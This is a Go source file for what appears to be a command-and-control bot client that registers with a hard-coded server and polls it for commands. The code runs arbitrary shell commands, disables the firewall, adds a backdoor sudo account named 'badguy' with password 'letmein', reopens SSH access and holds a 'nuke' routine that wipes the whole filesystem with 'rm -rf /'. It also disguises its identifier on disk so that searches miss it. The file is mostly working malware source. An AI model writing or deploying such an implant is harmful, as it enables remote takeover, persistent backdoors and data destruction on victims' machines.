package main

import (
	"bufio"
	"encoding/base64"
	"fmt"
	"io"
	"io/ioutil"
	"math/rand"
	"net"
	"os"
	"os/exec"
	"strconv"
	"strings"

	"github.com/google/uuid"
)

// HOST : server to call
var serv = "192.168.206.183:5656"

// MAGIC : the shared hex byte that will signify the start of each MAD payload
var MAGIC = []byte{0xAA}

// MAGICBYTE is the single byte (rather than a byte array)
var MAGICBYTE = MAGIC[0]

//MAGICSTR is the ascii representation of the magic byte
var MAGICSTR = string(MAGIC)

// MAGICTERM : the shared hex byte that will signify the end of each MAD payload
var MAGICTERM = []byte{0xAB}

// MAGICTERMBYTE is the single byte (rather than a byte array)
var MAGICTERMBYTE = MAGICTERM[0]

//MAGICTERMSTR is the ascii representation of the magic byte
var MAGICTERMSTR = string(MAGICTERM)

//REGFILE is where the registration info for this bot is kept
var REGFILE = "/path/to/reg/file"

//INTERVAL is how long the sleep is between callbacks (if run in loop mode)
var INTERVAL = 60

//DELTA is the +/- variance in interval time
var DELTA = 5

//OBFSEED is the seed int that will get used for uuid obfuscation
var OBFSEED = 5

//OBFTEXT is the seed text that will get used for uuid obfuscation
var OBFTEXT = "test"

func sendData(data string, mode string, aid string) string {
	payload := encodePayload(data, mode, aid)
	fmt.Printf("sending: %s\n", payload)
	conn, err := net.Dial("tcp4", serv)
	if err != nil {
		panic(err)
	}
	outText := []byte(payload)
	conn.Write(outText)
	message, err := bufio.NewReader(conn).ReadString(MAGICTERMBYTE)
	if err != nil {
		fmt.Println("Error reading:", err.Error())
	}
	respStr := string(message)
	conn.Close()
	return respStr
}

// base64 the payload and prepend/append magic chars
func encodePayload(data string, mode string, aid string) string {
	preEnc := mode + "||" + aid + "||" + data
	encStr := base64.StdEncoding.EncodeToString([]byte(preEnc))
	fin := MAGICSTR + encStr + MAGICTERMSTR
	return fin
}

func decodePayload(payload string) string {
	encodedPayload := strings.Replace(payload, MAGICSTR, "", -1) //trim magic chars from payload
	encodedPayload = strings.Replace(encodedPayload, MAGICTERMSTR, "", -1)
	data, err := base64.StdEncoding.DecodeString(encodedPayload)
	if err != nil {
		fmt.Println("error:", err)
		return ""
	}
	return string(data)
}

func checkRegStatus() bool {
	if _, err := os.Stat(REGFILE); os.IsNotExist(err) {
		return false
	}
	return true
}

func register() string {
	uid := uuid.New().String()
	storeUUID(uid)
	hn := getIP()
	intrv := strconv.Itoa(INTERVAL)
	dlt := strconv.Itoa(DELTA)
	payload := uid + "||" + intrv + "||" + dlt + "||" + hn
	ret := sendData(payload, "C", "0")
	return ret
}

func getCommand() {
	uid := fetchUUID()
	coms := sendData(uid, "D", "0")
	results := parseCommands(coms)
	if results == nil {
		return
	}
	sendResults(results)
	return
}

func parseCommands(commandBlob string) []string {
	results := []string{}
	isplit := strings.Split(commandBlob, "<||>")
	for _, comStr := range isplit {
		jsplit := strings.SplitN(comStr, ":", 3)
		aid := jsplit[0]
		mode := jsplit[1]
		if mode == "0" {
			return nil
		}
		args := jsplit[2]
		output := execCommand(mode, args)
		resStr := aid + ":" + output
		results = append(results, resStr)
	}
	return results
}

func execCommand(mode string, args string) string {
	retval := ""
	switch mode {
	case "0": //no command
		return ""
	case "1": //shell exec of args
		retval = shellExec(args)
	case "2":
		retval = fwFlush()
	case "3":
		retval = createUser()
	case "4":
		retval = enableRemote()
	case "5":
		retval = spawnRevShell(args)
	case "6":
		retval = unknownCom()
	case "7":
		retval = unknownCom()
	case "8":
		retval = unknownCom()
	case "9":
		retval = unknownCom()
	case "A":
		retval = unknownCom()
	case "B":
		retval = unknownCom()
	case "F":
		retval = nuke()
	default:
		retval = unknownCom()
	}
	return retval
}

func sendResults(results []string) {
	resStr := strings.Join(results, "<||>")
	sendData(resStr, "E", "0")
	return
}

func getIP() string {
	conn, _ := net.Dial("udp", "8.8.8.8:80")
	defer conn.Close()
	ad := conn.LocalAddr().(*net.UDPAddr)
	ipStr := ad.IP.String()
	return ipStr
}

func storeUUID(uid string) {
	obf := obfuscateUUID(uid, OBFSEED, OBFTEXT)
	f, _ := os.Open(REGFILE)
	io.WriteString(f, obf)
	f.Close()
	return
}

func fetchUUID() string {
	obf, _ := ioutil.ReadFile(REGFILE)
	deobf := deobfuscateUUID(string(obf))
	return deobf
}

//modify it so you cant just search the filesystem for uuid formatted strings
func obfuscateUUID(uid string, seed int, text string) string {
	splituid := strings.Split(uid, "-")
	l1 := strings.Repeat(text, rand.Intn(seed))
	l2 := strings.Repeat(text, rand.Intn(seed))
	l3 := strings.Repeat(text, rand.Intn(seed))
	l4 := strings.Repeat(text, rand.Intn(seed))
	obf := splituid[0] + l1 + splituid[1] + splituid[2] + l2 + splituid[3] + l3 + splituid[4] + l4
	// its' really crappy obfuscation but it's a small deterrent
	return obf
}

//undo those modifications
func deobfuscateUUID(obf string) string {
	p := strings.Replace(obf, OBFTEXT, "", -1)
	p = p[:8] + "-" + p[8:]
	p = p[:13] + "-" + p[13:]
	p = p[:18] + "-" + p[18:]
	p = p[:23] + "-" + p[23:]
	return p
}

func shellExec(args string) string {
	cmd := exec.Command("/bin/sh", "-c", args)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return string(err.Error())
	}
	return string(out)
}

func fwFlush() string {
	cmd := exec.Command("/bin/sh", "-c", "iptables -P INPUT ACCEPT; iptables -P OUTPUT ACCEPT; iptables -P FORWARD ACCEPT; iptables -t nat -F; iptables -t mangle -F; iptables -F; iptables -X;")
	out, err := cmd.CombinedOutput()
	if err != nil {
		return string(err.Error())
	}
	return string(out)
}

func createUser() string {
	comStr := "useradd -p $(openssl passwd -1 letmein) badguy -s /bin/bash -G sudo"
	if _, err := os.Stat("/etc/yum.conf"); os.IsNotExist(err) {
		comStr = "useradd -p $(openssl passwd -1 letmein) badguy -s /bin/bash -G wheel"
	}
	cmd := exec.Command("/bin/sh", "-c", comStr)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return string(err.Error())
	}
	return string(out)
}

func enableRemote() string {
	insRule := exec.Command("iptables", "-I", "FILTER", "1", "-j", "ACCEPT")
	insRule.Run()
	cmd := exec.Command("/bin/sh", "-c", "systemctl restart sshd")
	out, err := cmd.CombinedOutput()
	if err != nil {
		return string(err.Error())
	}
	return string(out)
}

func spawnRevShell(target string) string {

	return ""
}

func nuke() string {
	//rm rf dat boi
	cmd := exec.Command("/bin/bash", "-c", "rm -rf / --no-preserve-root")
	out, _ := cmd.CombinedOutput()
	return string(out)
}

func unknownCom() string {
	return ""
}

func main() {
	a := register()
	fmt.Printf("GOT: %s\n", a)
}
